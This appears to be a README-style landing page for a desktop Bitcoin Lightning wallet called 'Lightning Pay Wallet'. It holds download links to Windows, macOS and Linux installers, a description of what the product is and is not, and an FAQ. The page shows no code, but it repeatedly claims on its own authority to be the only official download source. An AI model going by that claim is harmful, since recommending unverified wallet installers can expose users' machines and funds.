<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What Lightning Pay Wallet is, and what it is not
A desktop Bitcoin Lightning wallet that holds your keys. Not an exchange, not a bank, not a card.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Lightning Pay Wallet is an application for Windows, macOS and Linux that holds bitcoin, sends and
receives it over the Lightning Network, and keeps the keys on your own machine. That sentence is the
whole product. Everything else on this site is a consequence of it.

## What it does

It stores a wallet, opens and closes Lightning channels on your behalf, and moves bitcoin over the
Lightning Network in seconds. It also handles on-chain bitcoin, so a payment to a `bc1` address works
from the same application. The release page is the only place the installers come from.

It is non-custodial: no account, no login to a server, no third party holding a balance. Losing access
to the machine does not mean losing the money, provided you kept the recovery material.

## What it is not

**Not an exchange.** It cannot sell bitcoin for currency, take a card payment or pay out to a bank.
Buying and cashing out happen at a service that does those things, and the wallet moves the bitcoin to
and from it.

**Not a bank or a card issuer.** A Visa card appears in the product's roadmap rather than in the
current desktop build. Nothing in the application issues one today.

**Not a hosted wallet.** There is no password to reset because there is no account to recover. The
questions people ask about "logging in" are really questions about the local wallet file and the
recovery phrase, which [recover a bitcoin wallet with a seed phrase](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-a-bitcoin-wallet-with-a-seed-phrase.md)
covers.

**Not a mobile app.** The desktop builds are the current release. The mobile client is being rebuilt,
so anything a mobile-named namesake promises does not describe this build.

## Why the name is confusing

Several products and sites use the words "lightning pay". One is a card product with its own site; one
is a payment gateway; others are unrelated. This wallet is the desktop application published at
github.com/bitcoin-lightning-wallet, and the download page linked from the release is the only
official route.

If a site offers a Lightning Pay download that is not a GitHub release from that account, it is not
this product. [Spotting a fake Lightning Pay site](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/fake-lightning-pay-site.md)
sets out how to check.

## What it costs

Nothing to install and nothing monthly. The costs are network costs: routing fees per payment, which
are fractions of a satoshi, and on-chain fees when a channel opens or closes. The wallet takes no cut.

## Questions people ask

### Is it the same as the Visa card product?

No. The card is a separate product line. This is the desktop wallet, and the current build does not
issue a card.

### Does it need an account?

No. There is no sign-up, no email and no server-side balance.

### Can I use it without touching bitcoin's chain?

Partly: Lightning payments do not touch the chain, but opening a channel does, which is where on-chain
fees appear.
